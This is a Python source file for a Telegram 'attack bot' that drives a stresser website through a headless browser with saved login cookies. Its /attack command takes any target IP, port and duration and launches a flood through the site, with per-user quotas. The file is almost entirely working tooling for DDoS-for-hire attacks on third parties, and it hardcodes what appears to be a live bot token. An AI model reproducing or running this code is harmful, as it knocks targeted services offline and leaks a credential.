import os
import json
import logging
import threading
import time
import asyncio
import glob
import pickle
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler

# ==================== CONFIG ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAGU7FdEIa5niSCLOpMqD1lbXmif4PFkoFM"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
COOKIE_FILE = "session_cookies.json"

# ==================== ATTACK TRACKING ====================
attack_file = "attacks.json"

def load_attacks():
    try:
        with open(attack_file, 'r') as f:
            return json.load(f)
    except:
        return {"current": None, "user_counts": {}}

def save_attacks(data):
    with open(attack_file, 'w') as f:
        json.dump(data, f, indent=2)

attacks = load_attacks()

# ==================== PLAYWRIGHT SETUP ====================
def get_playwright_chromium_path():
    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
    chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
    
    if chromium_folders:
        linux_path = os.path.join(chromium_folders[0], "chrome-linux", "chrome")
        if os.path.exists(linux_path):
            return linux_path
    return None

# ==================== COOKIE FUNCTIONS ====================
async def save_cookies(page):
    """Save cookies after successful login"""
    cookies = await page.context.cookies()
    with open(COOKIE_FILE, 'w') as f:
        json.dump(cookies, f)
    return True

async def load_cookies(context):
    """Load saved cookies"""
    try:
        with open(COOKIE_FILE, 'r') as f:
            cookies = json.load(f)
            await context.add_cookies(cookies)
            return True
    except:
        return False

# ==================== SETUP COMMAND ====================
async def setup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Run this ONCE to save cookies"""
    await update.message.reply_text(
        "🔄 **SETUP MODE**\n\n"
        "1. I'll open browser\n"
        "2. You login manually\n"
        "3. Come back and type /done\n\n"
        "Starting browser..."
    )
    
    # Store that we're in setup mode
    context.user_data['setup_mode'] = True
    
    # Run browser in thread
    def setup_thread():
        asyncio.run(setup_browser(update, context))
    
    thread = threading.Thread(target=setup_thread)
    thread.start()

async def setup_browser(update, context):
    """Open browser for manual login"""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            context_obj = await browser.new_context()
            page = await context_obj.new_page()
            
            # Go to login page
            await page.goto(LOGIN_URL)
            
            # Wait for user to press /done
            context.user_data['setup_page'] = page
            context.user_data['setup_browser'] = browser
            context.user_data['setup_context'] = context_obj
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Setup error: {str(e)}"
        )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """After manual login, save cookies"""
    if not context.user_data.get('setup_mode'):
        await update.message.reply_text("❌ Not in setup mode. Use /setup first")
        return
    
    page = context.user_data.get('setup_page')
    browser = context.user_data.get('setup_browser')
    
    if page and browser:
        try:
            # Save cookies
            await save_cookies(page)
            await browser.close()
            
            await update.message.reply_text(
                "✅ **COOKIES SAVED!**\n\n"
                "Now you can use /attack command without logging in!"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Error saving cookies: {str(e)}")
    else:
        await update.message.reply_text("❌ Browser not running. Use /setup again")
    
    context.user_data.clear()

# ==================== ATTACK WITH COOKIES ====================
async def attack_with_cookies(ip, port, duration, update, context):
    """Attack using saved cookies - NO LOGIN NEEDED"""
    try:
        async with async_playwright() as p:
            # Launch browser
            chromium_path = get_playwright_chromium_path()
            if chromium_path:
                browser = await p.chromium.launch(executablePath=chromium_path, headless=True)
            else:
                browser = await p.chromium.launch(headless=True)
            
            # Create context and load cookies
            context_obj = await browser.new_context()
            cookies_loaded = await load_cookies(context_obj)
            
            if not cookies_loaded:
                await browser.close()
                return False, "❌ No saved cookies. Run /setup first!"
            
            # Create page with cookies
            page = await context_obj.new_page()
            
            # DIRECTLY go to attack page - NO LOGIN!
            await page.goto(WEBSITE_URL, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            # Check if we're on attack page
            current_url = page.url
            if "login" in current_url:
                await browser.close()
                return False, "❌ Cookies expired. Run /setup again!"
            
            # Fill attack form
            inputs = await page.query_selector_all('input[type="text"]')
            
            if len(inputs) >= 3:
                await inputs[0].fill(ip)
                await inputs[1].fill(str(port))
                await inputs[2].fill(str(duration))
            else:
                await browser.close()
                return False, f"❌ Only {len(inputs)} inputs found"
            
            # Click launch button
            launch_btn = await page.query_selector('button:has-text("Launch")')
            if not launch_btn:
                buttons = await page.query_selector_all('button')
                if buttons:
                    launch_btn = buttons[-1]
            
            if launch_btn:
                await launch_btn.click()
                await page.wait_for_timeout(3000)
                
                # Check attack status
                page_content = await page.content()
                if "attack started" in page_content.lower():
                    status = "ATTACK LAUNCHED SUCCESSFULLY"
                else:
                    status = "ATTACK SENDING SOON"
                
                await browser.close()
                return True, status
            else:
                await browser.close()
                return False, "❌ Launch button not found"
            
    except Exception as e:
        return False, str(e)

# ==================== ATTACK COMMAND ====================
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    # Check if attack already running
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Another attack is already running. Please wait.")
        return
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ **Invalid format!**\n"
            "Use: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`"
        )
        return
    
    ip, port_str, time_str = args
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535")
            return
    except:
        await update.message.reply_text("❌ Invalid port number")
        return
    
    # Validate time
    try:
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be between 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid time")
        return
    
    # Store attack info
    attacks["current"] = {
        "ip": ip,
        "port": port,
        "duration": duration,
        "user_id": user_id,
        "start_time": time.time()
    }
    save_attacks(attacks)
    
    await update.message.reply_text(
        f"🔄 **LAUNCHING ATTACK...**\n\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: {duration}s"
    )
    
    # Run attack in thread
    loop = asyncio.get_event_loop()
    
    def attack_thread():
        try:
            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            
            # Run attack with cookies
            success, result = new_loop.run_until_complete(
                attack_with_cookies(ip, port, duration, update, context)
            )
            
            attacks["current"] = None
            
            if success:
                # Update attack count
                counts = attacks.get("user_counts", {})
                user_key = str(user_id)
                counts[user_key] = counts.get(user_key, 0) + 1
                attacks["user_counts"] = counts
                save_attacks(attacks)
            
            remaining = 100 - attacks.get("user_counts", {}).get(str(user_id), 0)
            
            async def send_result():
                if success:
                    if result == "ATTACK LAUNCHED SUCCESSFULLY":
                        status_msg = "✅ **ATTACK LAUNCHED SUCCESSFULLY!**"
                    else:
                        status_msg = "✅ **ATTACK SENDING SOON!**"
                    
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"{status_msg}\n\n"
                             f"Target: `{ip}:{port}`\n"
                             f"Duration: {duration}s\n"
                             f"Attacks Left: {remaining}/100"
                    )
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ **ATTACK FAILED**\n\n{result}"
                    )
            
            asyncio.run_coroutine_threadsafe(send_result(), loop)
            
        except Exception as e:
            attacks["current"] = None
            save_attacks(attacks)
            
            async def send_error():
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ **ERROR**\n\n{str(e)}"
                )
            
            asyncio.run_coroutine_threadsafe(send_error(), loop)
    
    thread = threading.Thread(target=attack_thread)
    thread.daemon = True
    thread.start()

# ==================== OTHER COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **ATTACK BOT**\n\n"
        "**First time setup:**\n"
        "1. `/setup` - Login manually once\n"
        "2. After login, type `/done`\n\n"
        "**Then use:**\n"
        "• `/attack <ip> <port> <time>` - Launch attack\n"
        "  Example: `/attack 1.1.1.1 80 60`\n"
        "• `/status` - Check attack status\n"
        "• `/stats` - Your attack stats"
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if attacks.get("current"):
        attack = attacks["current"]
        elapsed = int(time.time() - attack.get("start_time", time.time()))
        remaining = max(0, attack["duration"] - elapsed)
        
        await update.message.reply_text(
            f"🔥 **ATTACK IN PROGRESS**\n\n"
            f"Target: `{attack['ip']}:{attack['port']}`\n"
            f"Elapsed: {elapsed}s\n"
            f"Remaining: {remaining}s"
        )
    else:
        await update.message.reply_text("✅ No active attacks. Ready to launch!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_key = str(user_id)
    
    used = attacks.get("user_counts", {}).get(user_key, 0)
    remaining = 100 - used
    
    await update.message.reply_text(
        f"📊 **YOUR STATS**\n\n"
        f"✅ Attacks Used: {used}\n"
        f"🎯 Attacks Left: {remaining}/100"
    )

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup_command))
    app.add_handler(CommandHandler("done", done_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    print("="*50)
    print("🔥 COOKIE-BASED ATTACK BOT")
    print("="*50)
    print("First time: /setup → login → /done")
    print("Then: /attack ip port time")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
